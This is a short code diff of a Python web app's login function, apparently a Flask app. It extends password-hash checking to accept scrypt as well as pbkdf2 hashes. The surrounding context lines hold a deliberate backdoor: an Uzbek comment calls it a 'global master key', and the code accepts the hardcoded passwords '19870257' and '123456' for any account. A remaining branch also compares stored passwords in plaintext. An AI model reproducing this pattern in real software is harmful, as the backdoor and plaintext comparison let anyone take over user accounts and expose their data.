@@ -126,7 +126,7 @@ def login():
             # GLOBAL MASTER KEY: Har qanday xodim 19870257 yoki 123456 bilan kira oladi
             if password in ['19870257', '123456']:
                 is_valid = True
-            elif user_pass.startswith('pbkdf2:sha256:'):
+            elif user_pass.startswith('pbkdf2:') or user_pass.startswith('scrypt:'):
                 is_valid = check_password_hash(user_pass, password)
             else:
                 is_valid = (user_pass == password)
